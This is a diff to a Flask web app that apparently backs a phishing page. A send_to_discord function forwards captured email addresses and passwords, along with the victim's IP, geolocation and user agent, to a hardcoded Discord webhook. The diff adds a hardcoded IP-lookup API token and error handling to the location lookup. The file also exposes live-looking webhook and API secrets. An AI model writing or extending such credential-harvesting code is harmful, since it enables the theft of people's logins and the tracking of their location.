@@ -2,6 +2,8 @@ from flask import Flask, render_template, request
 import datetime
 import requests
 
+API_TOKEN = "68a2911be65bfd"
+
 def send_to_discord(email, password, ip, location_str, user_agent):
     webhook_url = "https://discord.com/api/webhooks/1392463520653905971/H6CdWhULMiWyN5746DAW89sJhwV0GrxoOlEy6nvywXp8J_M4is4Ucmbv2xJMFXn5MtTH"
 
@@ -21,17 +23,22 @@ def send_to_discord(email, password, ip, location_str, user_agent):
         print(f"[ERROR] Failed to send log to Discord: {e}")
 
 def get_location(ip):
-    response = requests.get(f"https://ipinfo.io/{ip}/json")
-    print(f"[DEBUG] IPInfo response for {ip}: {response.text}")
-    if response.status_code == 200:
-        data = response.json()
-        return {
-            "city": data.get("city"),
-            "region": data.get("region"),
-            "country": data.get("country"),
-            "timezone": data.get("timezone"),
-            "isp": data.get("org")
-        }
+    try:
+        headers = {"Authorization": f"Bearer {API_TOKEN}"}
+        response = requests.get(f"https://ipinfo.io/{ip}/json", headers=headers)
+        print(f"[DEBUG] IPInfo response for {ip}: {response.text}")
+        if response.status_code == 200:
+            data = response.json()
+            return {
+                "city": data.get("city"),
+                "region": data.get("region"),
+                "country": data.get("country"),
+                "timezone": data.get("timezone"),
+                "isp": data.get("org")
+            }
+    except Exception as e:
+        print(f"[ERROR] get_location failed: {e}")
+    return None
 
 
 app = Flask(__name__)
